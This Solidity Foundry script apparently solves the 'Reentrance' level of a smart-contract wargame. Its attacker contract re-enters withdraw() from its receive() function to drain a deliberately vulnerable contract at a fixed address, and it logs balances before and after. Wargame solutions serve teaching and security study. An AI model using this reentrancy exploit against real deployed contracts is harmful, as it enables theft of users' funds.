// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import "../src/levels/10-Reentrance/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ReentranceAttack {
    Reentrance reentranceInstance;
    uint256 baseAmount;

    constructor(Reentrance _reentranceInstance,uint256 _baseAmount) public payable {
        reentranceInstance = _reentranceInstance;
        baseAmount = _baseAmount;
    }

    function donateTo() public{
        reentranceInstance.donate{value : baseAmount}(address(this));
    }  

    function withdraw() public{
        reentranceInstance.withdraw(baseAmount);
    } 

    receive() external payable{
        reentranceInstance.withdraw(baseAmount);
    }
}

contract Level10Solution is Script {
    Reentrance reentranceInstance = Reentrance(payable(0xCfA6CF9F94A0a73E81B64a39223A7dd0e3bc00aB));

    function run() external {
        vm.startBroadcast();

        // check victim balance
        console.log("Victim Balance : ", address(reentranceInstance).balance);

        // decide the baseAmount for transaction
        uint256 baseAmount = address(reentranceInstance).balance;

        // deploy attack contract
        ReentranceAttack reAttackInstance = new ReentranceAttack{value : 2 * baseAmount}(reentranceInstance, baseAmount);

        // donate
        reAttackInstance.donateTo();

        // check
        console.log("Current Donation : ", reentranceInstance.balanceOf(address(reAttackInstance)));

        // withdraw to trig reentrance
        reAttackInstance.withdraw();

        // check if get all balance
        console.log("Attacker Balance : ", address(reAttackInstance).balance);
        console.log("Victim Balance : ", address(reentranceInstance).balance);

        vm.stopBroadcast();
    }
}